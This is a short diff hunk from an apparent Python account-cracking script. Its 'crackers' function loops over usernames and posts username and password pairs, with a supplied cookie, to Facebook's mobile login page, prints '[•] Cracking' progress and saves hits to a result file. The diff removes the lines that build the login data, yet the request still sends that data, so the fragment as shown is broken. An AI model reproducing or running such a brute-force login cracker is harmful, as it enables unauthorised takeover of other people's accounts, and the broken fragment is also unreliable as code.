@@ -27,10 +27,6 @@ def crackers(username, password, cookie):
 			print('\nresult saved on lib/result.txt')
 	except requests.exceptions.ConnectionError: pass
 
-                        data = {'email': user,
-                                'pass': password,
-                                'submit': 'login'
-                                }
                         print(f'\r[•] Cracking [{a}|{len(username)}]', end='', flush=True)
                         start = parser(requests.post('https://mbasic.facebook.com/login/?ref=dbl&fl', data=data,
                                 headers={'Cookie': cookie}).text, 'html.parser').title.text
